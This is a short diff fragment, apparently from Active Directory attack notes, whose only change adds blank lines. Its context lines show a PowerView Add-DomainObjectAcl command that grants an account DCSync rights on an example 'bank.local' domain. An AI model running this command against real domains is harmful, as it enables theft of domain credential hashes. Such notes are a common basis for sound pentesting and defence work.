@@ -22,3 +22,5 @@ Add-DomainObjectAcl  -Rights DCSync -TargetDomain $_DOMAIN -PrincipalIdentity $_
 ```
 PS C:\> Add-DomainObjectAcl  -Rights DCSync -TargetDomain bank.local -PrincipalIdentity service -Credential $Cred
 ```
+
+
